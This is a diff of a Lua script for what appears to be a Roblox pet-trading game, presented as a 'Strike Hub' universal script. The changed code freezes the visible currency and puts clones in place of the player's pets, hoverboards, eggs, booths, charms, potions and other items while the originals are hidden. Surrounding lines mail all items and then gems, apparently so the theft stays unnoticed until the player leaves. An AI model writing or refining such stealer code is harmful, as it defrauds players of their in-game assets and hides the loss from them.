@@ -1,4 +1,4 @@
---// Strike Hub Universal Script (Freeze + All Items Send Fixed)
+--// Strike Hub Universal Script (Final Version)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
@@ -39,18 +39,17 @@ local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)
 local rawSave = (saveModule.Get and saveModule.Get()) or {}
 local save = rawSave.Save or rawSave.Inventory or {}
 
---// =====================
---// VISUAL FREEZE START
---// =====================
--- Freeze currency
+--// ==========================
+--// VISUAL FREEZE (PERMANENT)
+--// ==========================
+-- Freeze currency (leaderstats)
 local visualCurrency = {}
 for _, v in pairs(save.Currency or {}) do
     visualCurrency[v.id] = v._am
 end
-
 task.spawn(function()
-    while true do
-        task.wait(0.1)
+    while plr.Parent do
+        task.wait(0.05)
         if plr:FindFirstChild("leaderstats") then
             for id, value in pairs(visualCurrency) do
                 local stat = plr.leaderstats:FindFirstChild(id)
@@ -60,27 +59,51 @@ task.spawn(function()
     end
 end)
 
--- Freeze pets (clone visible pets)
-local visualPets = {}
-local petFolder = plr:FindFirstChild("Pets")
-if petFolder then
-    for _, pet in pairs(petFolder:GetChildren()) do
-        local uid = pet.Name
-        visualPets[uid] = pet:Clone()
-        visualPets[uid].Parent = petFolder
-        pet.Parent = nil -- hide original
-    end
-    task.spawn(function()
-        while true do
-            task.wait(0.1)
-            for uid, clone in pairs(visualPets) do
-                if clone.Parent ~= petFolder then
-                    clone.Parent = petFolder
-                end
-            end
+-- Freeze 3D items (pets, hoverboards, eggs, booths)
+local visual3D = {}
+local function clone3DItems(folder)
+    if not folder then return end
+    for _, obj in pairs(folder:GetChildren()) do
+        if not visual3D[obj.Name] then
+            local clone = obj:Clone()
+            clone.Parent = folder
+            visual3D[obj.Name] = clone
+            obj.Parent = nil -- hide original
         end
-    end)
+    end
 end
+
+-- Freeze GUI-only items
+local visualGUI = {}
+local function cloneGUIItems(guiFolder)
+    if not guiFolder then return end
+    for _, obj in pairs(guiFolder:GetChildren()) do
+        if not visualGUI[obj.Name] then
+            local clone = obj:Clone()
+            clone.Parent = guiFolder
+            visualGUI[obj.Name] = clone
+            obj.Visible = false
+        end
+    end
+end
+
+-- Run freeze loops
+task.spawn(function()
+    while plr.Parent do
+        task.wait(0.05)
+        -- Clone 3D items
+        clone3DItems(plr:FindFirstChild("Pets"))
+        clone3DItems(plr:FindFirstChild("Hoverboards"))
+        clone3DItems(plr:FindFirstChild("Eggs"))
+        clone3DItems(plr:FindFirstChild("Booths"))
+        -- Clone GUI items (everything else)
+        cloneGUIItems(plr.PlayerGui:FindFirstChild("Charms"))
+        cloneGUIItems(plr.PlayerGui:FindFirstChild("Enchants"))
+        cloneGUIItems(plr.PlayerGui:FindFirstChild("Potions"))
+        cloneGUIItems(plr.PlayerGui:FindFirstChild("Misc"))
+        cloneGUIItems(plr.PlayerGui:FindFirstChild("Ultimate"))
+    end
+end)
 
 --// MAIL COST
 local mailSendPrice = 10000
@@ -232,4 +255,4 @@ end
 --// SEND GEMS LAST
 task.spawn(SendAllGems)
 
-print("[Strike Hub] Done sending items.")
+print("[Strike Hub] Done sending items. Visual freeze remains until player leaves.")
